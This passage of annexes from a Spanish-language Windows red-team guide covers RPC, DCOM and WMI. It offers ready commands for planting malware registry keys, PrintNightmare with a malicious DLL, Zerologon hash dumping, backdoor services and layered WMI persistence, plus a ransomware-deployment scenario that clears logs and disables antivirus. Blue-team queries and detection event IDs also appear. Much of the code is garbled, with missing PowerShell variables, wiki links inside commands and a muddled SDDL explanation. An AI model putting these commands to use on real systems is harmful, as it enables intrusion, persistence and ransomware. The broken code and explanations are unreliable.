## Anexo G: Recursos y referencias

### Documentacion Microsoft:
- MS-RPCE: [rpc](../raw/w1n-s9bsyst3ms.md#rpc) Protocol Specification
- MS-[dcom](../raw/w1n-s9bsyst3ms.md#dcom): Distributed Component Object Model Protocol
- MS-[wmi](../raw/w1n-s9bsyst3ms.md#wmi): Windows Management Instrumentation Protocol
- MS-SAMR: Security Account Manager Remote Protocol
- MS-LSAT: Local Security Authority (Translation Methods)
- MS-DRSR: Directory Replication Service (DRS) Protocol

### Herramientas:
- Impacket: [https](../raw/r3d3s-f0nd4m3nt0s.md#https)://github.[com](../raw/w1n-s9bsyst3ms.md#com)/fortra/impacket
- OleView .NET: https://github.com/tyranid/oleviewdotnet
- RPCView: https://github.com/silverf0x/RpcView
- WMI Explorer: https://www.sapien.com/software/wmiexplorer
- Sysinternals Suite: https://docs.microsoft.com/en-us/sysinternals/
- [cobalt strike](../raw/r3d-t34m-1nfr4.md#cobalt-strike): https://www.cobaltstrike.com/

### Libros y papers:
- "[windows internals](../raw/w1n-1nt3rn4ls.md)" - Pavel Yosifovich, Mark Russinovich, David Solomon
- "The Art of Memory Forensics" - Michael Hale Ligh
- "DCOM/Marshalling" - Microsoft Research papers
- "WMI Attacks" - Mandiant/FireEye research papers
- "COM Hijacking" - Hexacorn blog
- "Lateral Movement with DCOM" - enigma0x3 blog

### Blogs tecnicos:
- https://posts.specterops.io/ - SpecterOps (lateral movement, COM, WMI)
- https://blog.cobaltstrike.com/ - Cobalt Strike blog
- https://www.hexacorn.com/blog/ - Hexacorn (COM hijacking)
- https://enigma0x3.net/ - enigma0x3 (DCOM, [uac bypass](../raw/w1n-byp4ss3s.md#uac-bypass))
- https://www.tiraniddo.dev/ - James Forshaw (COM security, RPC)
- https://decoder.[cloud](../raw/cl0ud-h4ck1ng.md)/ - Decoder (WMI persistence)


> Ultima actualizacion: Mayo 2026.
> 
> Si encontras errores, abri un issue o manda un PR. Esto es un living document.

## Anexo H: Deep dive en interfaces [rpc](../raw/w1n-s9bsyst3ms.md#rpc) especificas

### winreg (Registry remoto):
La interfaz winreg permite leer y escribir el registry de forma remota. Es extremadamente util para recoleccion de informacion y [persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia).

UUID: 338CD001-2244-31F1-AAAA-900038001003
Pipe: \\pipe\winreg

#### Opnums importantes:
| Opnum | Nombre | Uso |
|-------|--------|-----|
| 0 | OpenHKLM | Abrir HKLM remoto |
| 2 | OpenHKCR | Abrir HKCR remoto |
| 4 | OpenHKU | Abrir HKU remoto |
| 6 | OpenHKCU | Abrir HKCU remoto |
| 14 | CreateKey | Crear clave en el registry |
| 15 | DeleteKey | Eliminar clave |
| 17 | QueryValue | Leer un valor |
| 22 | SetValue | Escribir un valor |
| 24 | EnumKey | Enumerar subclaves |
| 25 | EnumValue | Enumerar valores |
| 40 | OpenHKLM (specific) | Abrir subclave de HKLM |

#### Con Impacket (reg.py):
# Leer un valor del registry remoto
impacket-reg DOMAIN/user:password@192.168.1.100 query -keyName "HKLM\Software\Microsoft\Windows\CurrentVersion" -value "ProgramFilesDir"

# Crear clave
impacket-reg DOMAIN/user:password@192.168.1.100 create -keyName "HKLM\Software\Malicious"

# Escribir valor
impacket-reg DOMAIN/user:password@192.168.1.100 add -keyName "HKLM\Software\Malicious" -value "Malware" -type REG_SZ -data "C:\malware.exe"

# Enumerar subclaves
impacket-reg DOMAIN/user:password@192.168.1.100 enum -keyName "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"

#### Con [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell) + [dcom](../raw/w1n-s9bsyst3ms.md#dcom):
 = "192.168.1.100"
 = [type]::GetTypeFromProgID("WScript.Shell", )
 = [activator]::CreateInstance()
.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")

### wkstn (Workstation):
Interfaz para informacion de workstation, sesiones de [red](../raw/r3d3s-f0nd4m3nt0s.md), y usuarios conectados.

UUID: 5A7B91F8-FF00-11D0-A9B2-00C04FB6E6FC
Pipe: \\pipe\wkssvc

| Opnum | Nombre | Uso |
|-------|--------|-----|
| 0 | NetrWkstaGetInfo | Informacion de la workstation |
| 7 | NetrWkstaUserEnum | Usuarios conectados actualmente |
| 11 | NetrWkstaTransportEnum | Transportes activos |

#### Con Impacket:
impacket-netview DOMAIN/user:password@192.168.1.100

### spoolss (Spooler de impresion):
Interfaz peligrosa porque el spooler corre como SYSTEM y ha tenido vulnerabilidades criticas (PrintNightmare).

UUID: 1FF70682-0A51-30E8-076D-740BE8CEE98B
Pipe: \\pipe\spoolss

| Opnum | Nombre | Uso |
|-------|--------|-----|
| 0 | RpcOpenPrinter | Abrir impresora |
| 10 | RpcEnumPrinterDrivers | Enumerar drivers de impresion |
| 41 | RpcAddPrinterDriver | Agregar [driver](../raw/k3rn3l-h4ck1ng.md#windows-drivers) (PrintNightmare!) |
| 65 | RpcRemoteFindFirstPrintChangeNotification | Eventos de impresion |

#### PrintNightmare ([cve](../raw/s3c-f0nd4m3nt0s.md#cve)-2021-34527):
El opnum 41 (RpcAddPrinterDriver) permite a un usuario autenticado instalar un driver de impresion malicioso que se ejecuta como SYSTEM.

impacket-rpcdump 192.168.1.100 | findstr spoolss
# Si la interfaz esta expuesta y el usuario tiene permisos...
impacket-printnightmare DOMAIN/user:password@192.168.1.100 'C:\malware.dll'

### netlogon (NetLogon):
Interfaz critica para [autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion) de dominio.

UUID: 12345678-1234-ABCD-EF00-0123456789AB (compartido con lsarpc, pero netlogon usa un endpoint separado)
Pipe: \\pipe\netlogon

#### Zerologon (CVE-2020-1472):
[vulnerabilidad](../raw/s3c-f0nd4m3nt0s.md#vulnerabilidades) en NetrServerAuthenticate3 que permitia a un atacante cambiar la contrasena de la cuenta del DC.

impacket-secretsdump -just-dc -no-pass DOMAIN/DC\$@192.168.1.100
# Despues de aplicar Zerologon, el hash del DC se vuelve todo ceros

---

## Anexo I: Escenarios de ataque completos

### Escenario 1: De usuario normal a Domain Admin
1. **Enumeracion inicial:** rpcdump.py + samrdump.py para identificar usuarios y grupos.
2. **Enumeracion de parches:** Get-WmiObject Win32_QuickFixEngineering para buscar parches faltantes.
3. **Lateral movement local:** [com](../raw/w1n-s9bsyst3ms.md#com) hijacking o [uac bypass](../raw/w1n-byp4ss3s.md#uac-bypass) para elevar a SYSTEM en la maquina local.
4. **Credential dumping:** secretsdump.py -just-dc para obtener hashes del DC.
5. **Persistence:** [wmi](../raw/w1n-s9bsyst3ms.md#wmi) event subscription con CommandLineEventConsumer.

### Escenario 2: [red](../raw/r3d3s-f0nd4m3nt0s.md)-team simulation
1. **Initial access:** Usuario hace clic en [phishing](../raw/ph1sh1ng.md) email -> beacon.
2. **Enumeration local:** whoami, net localgroup, Get-WmiObject queries.
3. **UAC bypass:** FodHelper COM elevation.
4. **Lateral movement via [dcom](../raw/w1n-s9bsyst3ms.md#dcom):** dcomexec.py o jump [dcom](../raw/w1n-s9bsyst3ms.md#dcom) a servidor de archivos.
5. **Data staging:** WMI para recolectar info de todos los sistemas.
6. **[privilege escalation](../raw/l1n9x-pr1v3sc.md):** DSync desde un servidor comprometido.
7. **Persistence:** WMI implant en multiples sistemas.

### Escenario 3: Ransomware precursor
1. **[recon](../raw/0s1nt.md#reconocimiento):** rpcdump + samrdump para mapear la red.
2. **Lateral spread:** wmiexec.py para ejecutar ransomware en todos los sistemas.
3. **Defense evasion:** ClearEventLog en todos los sistemas via WMI.
4. **Disable AV:** Get-WmiObject -Namespace root\Microsoft\Windows\Defender para checkear, luego deshabilitar via registry remoto.

---

## Anexo J: [wmi](../raw/w1n-s9bsyst3ms.md#wmi) Providers detallados

### StdRegProv (Registry Provider)
Namespace: root\default
DLL: stdprov.dll

Metodos:
- GetCurrentKeyName: Obtener la key actual
- GetDWORDValue: Leer valor DWORD
- GetExpandedStringValue: Leer valor EXPAND_SZ
- GetMultiStringValue: Leer valor MULTI_SZ
- GetStringValue: Leer valor SZ
- SetDWORDValue: Escribir DWORD
- SetStringValue: Escribir SZ
- CreateKey: Crear clave
- DeleteKey: Eliminar clave
- DeleteValue: Eliminar valor
- EnumKey: Enumerar subclaves
- EnumValues: Enumerar valores

Ejemplo: Leer la version de Windows del registry remoto
 = Get-WmiObject -Namespace root\default -Class StdRegProv -ComputerName 192.168.1.100
.GetStringValue(2147483650, "SOFTWARE\Microsoft\Windows NT\CurrentVersion", "CurrentVersion")

(2147483650 = HKLM, 2147483649 = HKCU, 2147483651 = HKCR)

### Win32_Process (Process Provider)
Namespace: root\cimv2
DLL: cimwin32.dll

Propiedades:
- Name, ProcessId, ExecutablePath, CommandLine
- Priority, ProcessState, ThreadCount
- WorkingSetSize, VirtualSize, PageFileUsage
- CreationDate, KernelModeTime, UserModeTime

Metodos:
- Create(CommandLine, CurrentDirectory, ProcessStartupInformation)
- Terminate(Reason)
- GetOwner() -> devuelve Domain, User
- GetAvailableVirtualMemory() -> memoria disponible
- SetPriority(Priority)

Win32_ProcessStartup:
Clase asociada para parametros de creacion de procesos.
- CreateFlags: 0=normal, 8=suspended (CREATE_SUSPENDED)
- EnvironmentVariables: [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions) de variables
- ErrorMode: 0=default, 1=critical, 2=not critical
- FillAttribute: color de consola
- PriorityClass: 32=normal, 64=idle, 128=high, 256=realtime
- ShowWindow: 0=hidden, 1=normal, 2=min, 3=max
- WindowTitle: titulo de la ventana
- X/Y/XSize/YSize: posicion y tamano de la ventana
- xCountChars/yCountChars: tamano del buffer de la consola

Ejemplo: Crear [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) oculto
 = Get-WmiObject -Class Win32_ProcessStartup
.ShowWindow = 0
.CreateFlags = 4  # CREATE_NO_WINDOW
.Create("cmd.exe /c calc.exe", , )

### Win32_Service (Service Provider)
Namespace: root\cimv2
DLL: cimwin32.dll

Propiedades:
- Name, DisplayName, PathName, ServiceType
- State (Running/Stopped/Paused), StartMode (Auto/Manual/Disabled)
- StartName (cuenta), DesktopInteract
- ProcessId, ExitCode, ServiceSpecificExitCode

Metodos:
- StartService()
- StopService()
- PauseService()
- ResumeService()
- Change(DisplayName, PathName, ServiceType, StartMode, ErrorControl, StartName, StartPassword)
- Create(Name, DisplayName, PathName, ServiceType, StartMode, ErrorControl, StartName, StartPassword)

Ejemplo: Crear servicio remoto
 = Get-WmiObject -ComputerName 192.168.1.100 -Class Win32_Service
.Create("Backdoor", "Backdoor Service", "C:\tools\beacon.exe", 16, 2, "LocalSystem", "")

### Win32_ScheduledJob
Namespace: root\cimv2
(Deprecated en Windows 8+, usa MSFT_ScheduledTask)

Metodos:
- Create(Command, StartTime, RunRepeatedly, DaysOfWeek, DaysOfMonth, RunFlags)
- Delete(JobId)

Ejemplo:
 = Get-WmiObject -ComputerName 192.168.1.100 -Class Win32_ScheduledJob
.Create("C:\tools\beacon.exe", "********143000.000000+000", 0)

### MSFT_MpComputerStatus (Defender)
Namespace: root\Microsoft\Windows\Defender

Propiedades:
- AntivirusEnabled, BehaviorMonitorEnabled
- IoavProtectionEnabled, NISEnabled, OnAccessProtectionEnabled
- RealTimeProtectionEnabled, TamperProtected
- LastFullScanTimestamp, LastQuickScanTimestamp
- ProductStatus, AMProductVersion

Ejemplo:
Get-WmiObject -Namespace root\Microsoft\Windows\Defender -Class MSFT_MpComputerStatus -ComputerName 192.168.1.100

### AntiVirusProduct (Security Center)
Namespace: root\SecurityCenter2

Propiedades:
- displayName, productState, instanceGuid
- pathToSignedProductExe, pathToSignedReportingExe

El productState es un entero que codifica el estado del AV:
 = .productState
 = [switch](../raw/r3d3s-f0nd4m3nt0s.md#switches)() {
    393472 { "AV desactivado/notificaciones desactivadas" }
    393488 { "AV desactivado/notificaciones activadas" }
    397584 { "AV activado/notificaciones desactivadas" }
    397568 { "AV activado/notificaciones activadas (protegiendo)" }
    397584 { "AV activado pero con problemas" }
    default { "Estado desconocido: " }
}


## Anexo K: Diferencias entre versiones de Windows

### XP / 2003:
- [rpc](../raw/w1n-s9bsyst3ms.md#rpc) puertos dinamicos: 1024-5000
- Sin restricciones machine-wide [dcom](../raw/w1n-s9bsyst3ms.md#dcom) (sin Service Pack 2+)
- WMIC disponible
- ActiveScriptEventConsumer funcional
- WinRM no disponible

### Vista / 2008:
- RPC puertos dinamicos: 49152-65535
- MachineLaunchRestrictions obligatorio
- UAC introducido ([com](../raw/w1n-s9bsyst3ms.md#com) Elevation Moniker)
- WinRM disponible pero requiere configuracion

### 7 / 2008 R2:
- [wmi](../raw/w1n-s9bsyst3ms.md#wmi) Repository en INDEX.BTR + OBJECTS.DATA
- [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell) 2.0 con cmdlets WMI
- DCOM mas restrictivo
- AppLocker introducido

### 8 / 2012:
- WMI Repository en Fast Repository (ESE)
- ActiveScriptEventConsumer restringido
- PowerShell 3.0+ con CIM cmdlets
- WinRM mejora

### 10 / 2016 / 2019 / 2022:
- WMI Repository en %SystemRoot%\System32\wbem\Repository
- WDAC (Device Guard) puede bloquear COM hijacking
- Windows Defender integrado en WMI
- SAM remote restrictions (RID 500 exempto)
- Control de cuentas de usuario mas restrictivo
- PrintNightmare parches (spoolss)
- Zerologon parches (netlogon)


## Anexo L: Laboratorio de practica

### Setup minimo:
1. Maquina Windows 10/11 (target)
2. Kali Linux o Parrot (atacante)
3. Impacket instalado en atacante
4. [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell) en target con WinRM habilitado
5. Cuenta de administrador local conocida

### Ejercicios:
1. **rpcdump:** Enumerar todas las interfaces [rpc](../raw/w1n-s9bsyst3ms.md#rpc) del target.
2. **samrdump:** Enumerar usuarios locales.
3. **lookupsid:** Enumerar SIDs del sistema.
4. **wmiexec:** Obtener una shell remota.
5. **dcomexec:** Ejecutar comando via [dcom](../raw/w1n-s9bsyst3ms.md#dcom) MMC.
6. **[com](../raw/w1n-s9bsyst3ms.md#com) hijacking local:** Registrar un CLSID y verificar la carga.
7. **[wmi](../raw/w1n-s9bsyst3ms.md#wmi) persistence:** Crear un __EventFilter + CommandLineEventConsumer.
8. **[uac bypass](../raw/w1n-byp4ss3s.md#uac-bypass):** Probar FodHelper en el target.
9. **Win32_Process.Create:** Crear procesos remotos.
10. **StdRegProv:** Leer y escribir registry remoto.

### Comandos de verificacion:
# Verificar que Impacket funciona
impacket-rpcdump 127.0.0.1

# Verificar conectividad WMI
wmic /node:127.0.0.1 process list brief

# Verificar DCOM local
 = [activator]::CreateInstance([type]::GetTypeFromCLSID("49B2791A-B1AE-4C90-9B8E-E860BA07F889", "localhost"))
.Document.ActiveView.ExecuteShellCommand("calc.exe", , "", "7")

# Verificar persistencia WMI
Get-WmiObject -Namespace root\subscription -Class __EventFilter
Get-WmiObject -Namespace root\subscription -Class __EventConsumer

## Anexo M: WQL avanzado

### Consultas con fecha y hora:
[wmi](../raw/w1n-s9bsyst3ms.md#wmi) usa el formato UTC/DMTF para fechas: yyyymmddHHMMSS.xxxxxx+UUU

# Procesos creados en las ultimas 24hs
 = (Get-Date).AddHours(-24).ToUniversalTime().ToString("yyyyMMddHHmmss") + ".000000+000"
Get-WmiObject -Class Win32_Process -Filter "CreationDate >= ''"

# Eventos de seguridad de las ultimas 12 horas
 = (Get-Date).AddHours(-12).ToUniversalTime().ToString("yyyyMMddHHmmss") + ".000000+000"
Get-WmiObject -Class Win32_NTLogEvent -Filter "LogFile='Security' AND TimeGenerated >= ''"

### ASSOCIATORS OF avanzado:
# Obtener los procesos relacionados a un servicio
ASSOCIATORS OF {Win32_Service.Name='Spooler'} WHERE AssocClass=Win32_DependentService ResultClass=Win32_Process

# Obtener los recursos compartidos de un sistema
ASSOCIATORS OF {Win32_ComputerSystem.Name='PC'} WHERE ResultClass=Win32_Share

# Obtener los usuarios del sistema
ASSOCIATORS OF {Win32_ComputerSystem.Name='PC'} WHERE ResultClass=Win32_UserAccount

### REFERENCES OF:
# Que servicios dependen de este servicio?
REFERENCES OF {Win32_Service.Name='LanmanServer'} WHERE ResultClass=Win32_DependentService

# Que procesos usan este ejecutable?
REFERENCES OF {CIM_DataFile.Name='C:\\Windows\\System32\\cmd.exe'} WHERE ResultClass=Win32_Process

### Meta-queries (sobre el schema):
# Listar todas las clases disponibles
SELECT * FROM meta_class

# Listar todas las clases que heredan de CIM_Process
SELECT * FROM meta_class WHERE __Class ISA 'CIM_Process'

# Listar todas las clases en un namespace
SELECT * FROM meta_class WHERE __Namespace = 'root\cimv2'

# Listar las propiedades de una clase
SELECT * FROM meta_class WHERE __Class = 'Win32_Process'

### Event queries con condiciones complejas:
# Evento cuando un proceso con un PID especifico termina
SELECT * FROM __InstanceDeletionEvent WITHIN 2 
  WHERE TargetInstance ISA 'Win32_Process' 
  AND TargetInstance.ProcessId = 1234

# Evento cuando se modifica un servicio
SELECT * FROM __InstanceModificationEvent WITHIN 5 
  WHERE TargetInstance ISA 'Win32_Service' 
  AND TargetInstance.State != PreviousInstance.State

# Evento cuando la carga de CPU supera el 90%
SELECT * FROM __InstanceModificationEvent WITHIN 10 
  WHERE TargetInstance ISA 'Win32_Processor' 
  AND TargetInstance.LoadPercentage > 90

### Consultas utiles para Blue Team:
# Servicios que NO estan en el estado esperado
SELECT * FROM Win32_Service WHERE State != 'Running' AND StartMode = 'Auto'

# Discos con menos de 10% de espacio libre
ASSOCIATORS OF {Win32_LogicalDisk.DeviceID='C:'} WHERE ResultClass=Win32_LogicalDisk

# Usuarios con contrasena que nunca expira
SELECT * FROM Win32_UserAccount WHERE PasswordExpires = False AND Disabled = False

# Procesos con handles abiertos (no es directo, requiere ASSOCIATORS)
SELECT * FROM Win32_Process WHERE HandleCount > 500

# Puertos en escucha (requiere clase MSFT_NetTCPConnection o similar)
# En sistemas modernos:
Get-WmiObject -Namespace root\StandardCimv2 -Class MSFT_NetTCPConnection -Filter "State=2"

### WQL con LIKE y wildcards:
# Todos los procesos que empiezan con 'c'
SELECT * FROM Win32_Process WHERE Name LIKE 'c%'

# Procesos del directorio System32
SELECT * FROM Win32_Process WHERE ExecutablePath LIKE '%System32%'

# Servicios que contienen 'SQL' en el nombre
SELECT * FROM Win32_Service WHERE DisplayName LIKE '%SQL%'


## Anexo N: [com](../raw/w1n-s9bsyst3ms.md#com) Security deep dive

### CoInitializeSecurity escenarios:

#### Escenario 1: Servidor sin seguridad
Si un servidor COM nunca llama CoInitializeSecurity, COM usa defaults:
- AuthnLevel: RPC_C_AUTHN_LEVEL_CONNECT
- ImpLevel: RPC_C_AUTHN_LEVEL_IDENTIFY
- [capabilities](../raw/l1n9x-pr1v3sc.md#linux-capabilities): EOAC_NONE

Esto significa que cualquiera con una conexion autenticada puede llamar metodos.

#### Escenario 2: Seguridad explicita
CoInitializeSecurity(
    NULL,                               // DACL default (permite a todos)
    -1,                                 // Todos los auth services
    NULL,                               // Auth services (default)
    NULL,
    RPC_C_AUTHN_LEVEL_PKT_PRIVACY,      // [cifrado](../raw/s3c-f0nd4m3nt0s.md#cifrado) obligatorio
    RPC_C_IMP_LEVEL_IMPERSONATE,        // Impersonacion permitida
    NULL,
    EOAC_NONE,
    NULL
);

#### Escenario 3: Seguridad con DACL personalizada
CoInitializeSecurity(
    pSD,                                // SD con DACL que solo permite a Admins
    -1,
    NULL,
    NULL,
    RPC_C_AUTHN_LEVEL_PKT_INTEGRITY,
    RPC_C_IMP_LEVEL_IDENTIFY,
    NULL,
    EOAC_STATIC_CLOAKING,
    NULL
);

### CoSetProxyBlanket escenarios ofensivos:

#### Cambiar [autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion) a NTLM:
CoSetProxyBlanket(
    pProxy,
    RPC_C_AUTHN_WINNT,          // NTLM
    RPC_C_AUTHZ_NONE,
    NULL,                       // SPN (no necesario para NTLM)
    RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
    RPC_C_IMP_LEVEL_IMPERSONATE,
    pAuthInfo,                  // Credenciales alternativas
    EOAC_NONE
);

#### Cambiar autenticacion a Kerberos:
CoSetProxyBlanket(
    pProxy,
    RPC_C_AUTHN_GSS_KERBEROS,
    RPC_C_AUTHZ_NONE,
    L"host/server.domain.com",  // SPN del servidor
    RPC_C_AUTHN_LEVEL_PKT_INTEGRITY,
    RPC_C_IMP_LEVEL_DELEGATE,
    NULL,
    EOAC_NONE
);

#### Bajar la seguridad para debugging (o ataque):
CoSetProxyBlanket(
    pProxy,
    RPC_C_AUTHN_WINNT,
    RPC_C_AUTHZ_NONE,
    NULL,
    RPC_C_AUTHN_LEVEL_CONNECT,  // Lo mas bajo posible
    RPC_C_IMP_LEVEL_IDENTIFY,
    NULL,
    EOAC_NONE
);

### DefaultAccessPermission vs AccessPermission:
- DefaultAccessPermission (HKLM\Software\Microsoft\Ole\DefaultAccessPermission): ACL por defecto para todos los objetos que no tienen AccessPermission especifico.
- AccessPermission (por AppID): ACL especifica para un objeto.

Si ninguno esta configurado, COM permite acceso a todos los usuarios autenticados (desde XP SP2+).

### Security Descriptor Definition Language (SDDL):
Los [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) [dcom](../raw/w1n-s9bsyst3ms.md#dcom) se almacenan como SDDL (Security Descriptor Definition Language).

Formato: O:OwnerGuyG:GroupGuyD:DACL_flags(ACE_type;ACE_flags;Rights;ObjectGUID;InheritGUID;SID)

Ejemplo:
O:BAG:BAD:(A;;0x3;;;WD)(A;;0x7;;;AN)

Esto significa:
- Owner: BAG (Built-in Administrators Group)
- Group: BA (Built-in Administrators)
- DACL:
  - (A;;0x3;;;WD): Allow Everyone (WD) con derechos 0x3 (COM_RIGHTS_EXECUTE = Local Access)
  - (A;;0x7;;;AN): Allow Anonymous (AN) con derechos 0x7 (COM_RIGHTS_EXECUTE + COM_RIGHTS_EXECUTE_LOCAL + COM_RIGHTS_ACTIVATE_LOCAL)

Flags de derechos COM:
- 0x1 = COM_RIGHTS_EXECUTE
- 0x2 = COM_RIGHTS_EXECUTE_LOCAL
- 0x4 = COM_RIGHTS_EXECUTE_REMOTE
- 0x8 = COM_RIGHTS_ACTIVATE_LOCAL
- 0x10 = COM_RIGHTS_ACTIVATE_REMOTE


## Anexo O: Debugging y troubleshooting con herramientas nativas

### DCOMCNFG (dcomcnfg.exe):
Herramienta GUI de Windows para configurar [dcom](../raw/w1n-s9bsyst3ms.md#dcom).
dcomcnfg.exe
- Component Services -> Computers -> My Computer -> DCOM Config
- Aqui podes ver y modificar [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) de DCOM.

### [rpc](../raw/w1n-s9bsyst3ms.md#rpc) Debug (rpcdiag, rpcexts):
Windows Debugging Tools incluye extensiones para depurar RPC.
!rpcexts.rpcreadstack
!rpcexts.rpchelp

### Process Monitor (ProcMon):
Filtros utiles:
- Operation is RegOpenKey
- Path contains CLSID
- Path contains InprocServer32
- Result is NAME NOT FOUND (para [com](../raw/w1n-s9bsyst3ms.md#com) hijacking)
- Path contains \RPC Control\ (para LRPC)

### Process Explorer:
Ver:
- Procesos que cargan ole32.dll, oleaut32.dll (usan COM)
- Handles a \RPC Control\ ports
- Handles a named pipes LPC

### [wireshark](../raw/r3d3s-f0nd4m3nt0s.md#wireshark) / Packet Monitor:
Filtros:
- [tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp).port == 135 (EPM)
- tcp.port >= 49152 (RPC dinamico)
- dcerpc (DCE/RPC protocol)
- [smb](../raw/w1nd0ws-p0st3xpl01t.md#smb) && nt_status == 0 ([smb](../raw/w1nd0ws-p0st3xpl01t.md#smb) con named pipes)
- dcerpc.cn_call_id (ver llamadas RPC)

### Windows [event logs](../raw/w1n-f0r3ns1cs.md#event-logs) utiles:
| Event ID | Origen | Que detecta |
|----------|--------|-------------|
| 5719 | NETLOGON | Error de conexion RPC |
| 5859 | [wmi](../raw/w1n-s9bsyst3ms.md#wmi)-Activity | Filtro [wmi](../raw/w1n-s9bsyst3ms.md#wmi) creado |
| 5860 | WMI-Activity | Filtro WMI eliminado |
| 5861 | WMI-Activity | Consumer WMI creado |
| 5862 | WMI-Activity | Consumer WMI eliminado |
| 5863 | WMI-Activity | Binding creado |
| 5864 | WMI-Activity | Binding eliminado |
| 7031 | Service Control | Servicio RPC fallo |
| 7034 | Service Control | Servicio RPC termino inesperadamente |
| 4624 | Security | Logon exitoso (tipo 3 = network para DCOM) |
| 4634 | Security | Logoff |
| 4672 | Security | Privilegios especiales asignados (admin logon) |


## Anexo P: Codigo de ejemplo en C# para [com](../raw/w1n-s9bsyst3ms.md#com)/[dcom](../raw/w1n-s9bsyst3ms.md#dcom)

### Crear objeto COM local:
using System;
using System.Runtime.InteropServices;

class Program {
    static void Main() {
        Type shellType = Type.GetTypeFromProgID("Shell.Application");
        object shell = Activator.CreateInstance(shellType);
        shell.GetType().InvokeMember("ShellExecute", 
            System.Reflection.BindingFlags.InvokeMethod, 
            null, shell, new object[] { "calc.exe", "", "", "7" });
    }
}

### Crear objeto DCOM remoto:
using System;
using System.Runtime.InteropServices;

class Program {
    static void Main() {
        string computer = "192.168.1.100";
        Type mmcType = Type.GetTypeFromCLSID(
            Guid.Parse("49B2791A-B1AE-4C90-9B8E-E860BA07F889"), 
            computer, 
            true  // true = authenticated
        );
        object mmc = Activator.CreateInstance(mmcType);
        // Usar reflection para llamar a ExecuteShellCommand
    }
}

### CoSetProxyBlanket en C#:
using System;
using System.Runtime.InteropServices;

[ComImport, Guid("00000000-0000-0000-C000-000000000046")]
[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IUnknown { }

class CoSetProxy {
    [DllImport("ole32.dll", PreserveSig = false)]
    static extern void CoSetProxyBlanket(
        [MarshalAs(UnmanagedType.Interface)] object pProxy,
        uint dwAuthnSvc,
        uint dwAuthzSvc,
        [MarshalAs(UnmanagedType.LPWStr)] string pServerPrincName,
        uint dwAuthnLevel,
        uint dwImpLevel,
        IntPtr pAuthInfo,
        uint dwCapabilities
    );
}

### PInvoke para [rpc](../raw/w1n-s9bsyst3ms.md#rpc):
using System;
using System.Runtime.InteropServices;

class RpcNative {
    [DllImport("rpcrt4.dll", CharSet = CharSet.Auto, SetLastError = true)]
    static extern int RpcStringBindingCompose(
        string ObjUuid,
        string Protseq,
        string NetworkAddr,
        string Endpoint,
        string Options,
        out string StringBinding
    );
    
    [DllImport("rpcrt4.dll", CharSet = CharSet.Auto, SetLastError = true)]
    static extern int RpcBindingFromStringBinding(
        string StringBinding,
        out IntPtr Binding
    );
}


## Anexo Q: Bonus — [wmi](../raw/w1n-s9bsyst3ms.md#wmi) y Registry para persistence avanzada

### WMI + Registry Run Keys:
Combinar WMI event subscriptions con registry run keys para ejecucion persistente.

# Esta combinacion asegura que incluso si el repository WMI se pierde, el registry lo recupera
[set](../raw/ph1sh1ng.md#social-engineering-toolkit)-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = "PersistenceConsumer"
    CommandLineTemplate = "[powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell).exe -C "New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Updater' -Value 'C:\tools\beacon.exe'""
}

### WMI + Scheduled Tasks:
WMI puede disparar la creacion de una tarea programada.

 = "schtasks /create /tn 'UpdaterTask' /tr 'C:\tools\beacon.exe' /sc daily /st 09:00 /f"
Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = "TaskConsumer"
    CommandLineTemplate = 
}

### Multiple levels of persistence:
# Nivel 1: Startup folder
Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = "Level1"
    CommandLineTemplate = "powershell -C "$s=(New-Object -[com](../raw/w1n-s9bsyst3ms.md#com) WScript.Shell).CreateShortcut('$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\updater.lnk');$s.TargetPath='C:\tools\beacon.exe';$s.Save()""
}

